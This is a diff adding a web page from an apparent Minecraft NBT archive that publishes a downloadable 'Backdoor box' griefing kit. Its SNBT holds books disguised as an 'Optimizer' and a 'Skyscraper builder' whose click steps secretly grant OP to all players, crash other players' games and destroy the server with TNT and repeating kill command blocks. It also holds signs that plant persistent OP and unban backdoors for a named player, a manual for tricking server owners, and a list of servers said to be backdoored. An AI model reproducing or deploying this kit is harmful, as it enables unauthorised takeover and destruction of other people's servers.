@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<meta name="description" content="A collection of NBT data for Shulker Kits and Items."/>
+
+<head>
+    <title>The Shulker Archives</title>
+    <link rel="icon" href="../../assets/favicon.ico" type="image/png"/>
+    <meta charset="utf-8"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1"/>
+    <link rel="stylesheet" href="../../assets/main.min.css"/>
+</head>
+
+<header>
+    <span class="ShulkerLogoText"><a href="../../index.html">Shulker Archives</a></span>
+    <p class="ShulkerLogo">
+            <video autoplay loop muted playsinline height="100px" width="100px">
+                <source src="../../assets/Shulker_shooting.webm" type="video/webm" />
+            </video>
+    </p>
+    <h2>Welcome to the Shulker Archives</h2>
+    <hr>
+    <a href="../../html/UsingNBT.html">
+        <button class="button" type="button">Using NBT</button>
+    </a>
+    <a href="../../html/Resources.html">
+        <button class="button" type="button">Resources</button>
+    </a>
+    <a href="../../html/snbtlinter.html">
+        <button class="button" type="button">SNBT Linter</button>
+    </a>
+    <hr>
+</header>
+
+<body class="NBT">
+<main class="NBT">
+    <h3>NBT File:</h3>
+    <p><a href="nbt/BackdoorBoxDevVer.nbt" download>BackdoorBoxDevVer.nbt</a></p>
+    <hr>
+    <h3>SNBT</h3>
+    <pre><code>{BlockEntityTag:{Items:[{Count:1b,Slot:0b,id:"minecraft:written_book",tag:{author:"root@kali",display:{Lore:['{"text":"A manual for high-level trolling."}','{"text":"The complete guide to gaining access and causing chaos."}'],Name:'{"italic":false,"color":"red","text":"Readme: High-level trolling with Abuse Kit V4"}'},pages:['{"text":"Using the Skyscraper and Optimizer books to gain access:\\nEach book has the goal of granting OP to all players.\\nThe Skyscraper book disables the owner by crashing their game, while the Optimizer book does not. Choose wisely. Simply give one of them to the owner."}','{"text":"Using the Chaos Book after gaining OP:\\nUsing Command Stealth and TrueStealth is advised. Use the other entries to hinder the owner and destroy the server."}','{"text":"Using Backdoors and Troll Signs:\\nHaving custom \\"backdoor\\" signs that give you  OP or unban you is advised. The Abuse Kit v4 includes signs for trolling if clicked. They require OP to place."}'],resolved:1b,title:"HLT Manual"}},{Count:1b,Slot:1b,id:"minecraft:written_book",tag:{author:"root@kali",display:{Lore:['{"text":"Click the steps for continuous lag protection!"}','{"bold":true,"italic":false,"color":"dark_red","text":"REQUIRES OP"}'],Name:'{"bold":true,"color":"gold","text":"X-TREME Optimizer"}'},generation:0,pages:['{"clickEvent":{"action":"run_command","value":"/gamerule sendCommandFeedback false"},"hoverEvent":{"action":"show_text","contents":{"text":"Prepares to create optimizer."}},"extra":[{"clickEvent":{"action":"run_command","value":"/minecraft:kill @e[type=item,type=area_effect_cloud]"},"hoverEvent":{"action":"show_text","contents":{"text":"Adds lag clear module"}},"text":"Optimizer Step 1\\n"},{"clickEvent":{"action":"run_command","value":"/op @a"},"hoverEvent":{"action":"show_text","contents":{"text":"Finishes the optimizer."}},"text":"Optimizer Step 2\\n"},{"clickEvent":{"action":"run_command","value":"/tellraw @a {\\"text\\":\\"Server optimized by X-TREME OPTIMIZER\\",\\"color\\":\\"gold\\",\\"bold\\":true}"},"hoverEvent":{"action":"show_text","contents":{"text":"OPTIONAL: Add extra crash protection"}},"text":"Optimizer Step 3"}],"text":"Optimizer Step 0\\n"}'],resolved:1b,title:"Optimizer Book"}},{Count:1b,Slot:2b,id:"minecraft:written_book",tag:{author:"root@kali",display:{Lore:['{"bold":true,"italic":false,"color":"red","text":"Ultimate trolling!"}','{"bold":true,"italic":false,"color":"dark_red","text":"REQUIRES OP"}','{"text":"It\'s like rm -rf / but in Minecraft"}'],Name:'{"bold":true,"italic":false,"color":"dark_red","text":"CHAOS BOOK"}'},generation:0,pages:['{"color":"red","clickEvent":{"action":"run_command","value":"/gamerule sendCommandFeedback false"},"hoverEvent":{"action":"show_text","contents":{"text":"Turns off command feedback."}},"extra":[{"color":"blue","clickEvent":{"action":"run_command","value":"/effect give @s invisibility 10000 2 true"},"hoverEvent":{"action":"show_text","contents":{"text":"Particle-free invisibility"}},"text":"TrueStealth\\n"},{"color":"dark_red","clickEvent":{"action":"run_command","value":"/execute as @a[distance=3..] at @s run particle flame ~ ~ ~ 1 1 1 1 999999999 force @s"},"hoverEvent":{"action":"show_text","contents":{"text":"Literally crashes everyone else\'s game.\\nYou own the server now."}},"text":":(){ :|:& };:\\n"},{"color":"gold","clickEvent":{"action":"run_command","value":"/fill ~-15 ~-1 ~-15 ~16 ~-32 ~16 tnt"},"hoverEvent":{"action":"show_text","contents":{"text":"Create a MASSIVE TNT block!"}},"text":"sudo rm -rf /\\n"},{"color":"dark_aqua","clickEvent":{"action":"run_command","value":"/execute as @e[limit=7] run execute as @e[limit=191] run summon tnt_minecart"},"hoverEvent":{"action":"show_text","contents":{"text":"Summons up to 1337 TNT minecarts."}},"text":"1337 Nuke\\n"},{"color":"gray","clickEvent":{"action":"run_command","value":"/deop @a[distance=2.."},"hoverEvent":{"action":"show_text","contents":{"text":"Deop all other players"}},"text":"Access Denied\\n"},{"color":"dark_gray","clickEvent":{"action":"run_command","value":"/op @a"},"hoverEvent":{"action":"show_text","contents":{"text":"Ops all players"}},"text":"Access Granted\\n"},{"color":"dark_purple","clickEvent":{"action":"run_command","value":"/setblock ~ ~ ~ repeating_command_block{Command:\\"/minecraft:kill @e\\",auto:1b} replace"},"hoverEvent":{"action":"show_text","contents":{"text":"USE WITH CAUTION!\\nPlaces repeating kill @e commandblock"}},"text":"Server Killer\\n"},{"color":"dark_blue","clickEvent":{"action":"run_command","value":"/execute as @e[limit=5] run execute at @e run summon tnt"},"hoverEvent":{"action":"show_text","contents":{"text":"Explodes all entities"}},"text":"Destruction 9000"}],"text":"Command Stealth\\n"}'],resolved:1b,title:"Optimizer Book"}},{Count:1b,Slot:3b,id:"minecraft:written_book",tag:{author:"root@kali",display:{Lore:['{"text":"Builds a skyscraper by clicking all the steps!"}','{"bold":true,"italic":false,"color":"dark_red","text":"REQUIRES OP"}'],Name:'{"bold":true,"color":"blue","text":"Skyscraper EZ-Builder"}'},pages:['{"clickEvent":{"action":"run_command","value":"/gamerule sendCommandFeedback false"},"hoverEvent":{"action":"show_text","contents":{"text":"Hide awful command messages."}},"extra":[{"clickEvent":{"action":"run_command","value":"/fill ~-8 ~-1 ~-8 ~8 ~64 ~8 stone_bricks hollow"},"hoverEvent":{"action":"show_text","contents":{"text":"Build the shell."}},"text":"Skyscraper Step 1\\n"},{"clickEvent":{"action":"run_command","value":"/op @a[distance=2..]"},"hoverEvent":{"action":"show_text","contents":{"text":"Prepare to decorate."}},"text":"Skyscraper Step 2\\n"},{"clickEvent":{"action":"run_command","value":"/particle flame ~ ~ ~ 1 1 1 1 999999999 force @s"},"hoverEvent":{"action":"show_text","contents":{"text":"Execute decorations on the building."}},"text":"Skyscraper Step 3"}],"text":"Skyscraper Step 0\\n"}'],resolved:1b,title:"Skyscraper Book"}},{Count:1b,Slot:4b,id:"minecraft:oak_sign",tag:{BlockEntityTag:{Text1:'{"text":"Right click","clickEvent":{"action":"run_command","value":"setblock ^ ^ ^ repeating_command_block{Command:\\"/gmc Kritikal___Error\\",auto:1b} replace"}}',Text2:'{"text":"for BACKDOOR"}'},display:{Name:'{"text":"GMC backdoor"}'}}},{Count:1b,Slot:5b,id:"minecraft:oak_sign",tag:{BlockEntityTag:{Text1:'{"text":"Right click","clickEvent":{"action":"run_command","value":"setblock ^ ^ ^ repeating_command_block{Command:\\"/unban KriTikal___Error\\",auto:1b} replace"}}',Text2:'{"text":"for BACKDOOR"}'},display:{Name:'{"text":"Unban backdoor"}'}}},{Count:1b,Slot:6b,id:"minecraft:oak_sign",tag:{BlockEntityTag:{Text1:'{"text":"Right click","clickEvent":{"action":"run_command","value":"setblock ^ ^ ^ repeating_command_block{Command:\\"/sudo @a /op KriTikal___Error\\",auto:1b} replace"}}',Text2:'{"text":"for BACKDOOR"}'},display:{Name:'{"text":"OP backdoor"}'}}},{Count:1b,Slot:7b,id:"minecraft:oak_sign",tag:{BlockEntityTag:{Text1:'{"text":"Right click","clickEvent":{"action":"run_command","value":"setblock ^ ^ ^ repeating_command_block{Command:\\"/op Kritikal___Error\\",auto:1b} replace"}}',Text2:'{"text":"for BACKDOOR"}'},display:{Name:'{"text":"OP backdoor"}'}}},{Count:1b,Slot:8b,id:"minecraft:command_block",tag:{}},{Count:1b,Slot:9b,id:"minecraft:writable_book",tag:{RepairCost:0,display:{Name:'{"text":"Backdoored servers."}'},pages:["Backdoored servers of minehut (as of 9/23/2020)
+1.Pillowoek
+2.survilfun
+(more soon, obviously)
+You can request op via /msg KriTikal___Error or my (discord:Memerman#2168"]}},{Count:1b,Slot:10b,id:"minecraft:tripwire_hook",tag:{HideFlags:32,display:{Lore:['{"text":"LEAKING THIS KEY WILL RESULT"}','{"text":"IN A LACK OF UPDATES TO YOU"}'],Name:'{"text":"122573729493ASDFJS29384772738DJSJAKCIS392838AQERTY853748"}'}}},{Count:1b,Slot:11b,id:"minecraft:name_tag",tag:{Enchantments:[{id:"minecraft:sharpness",lvl:1337s}],display:{Lore:['{"italic":false,"color":"red","text":"The ultimate griefing kit."}','{"italic":false,"color":"gold","text":"Created by EnderEyeGames"}'],Name:'{"italic":false,"color":"red","extra":[{"bold":true,"italic":false,"color":"gold","text":"v4"}],"text":"Abuse Kit "}'}}}]},display:{Name:'{"text":"Backdoor box (DEV VER)"}'}}</code></pre>
+</main>
+<div class="footer">
+    <p>Created by KaddicusAlmighty</p>
+</div>
+<script src="../../assets/js/copy.min.js"></script>
+</body>
+
+</html>
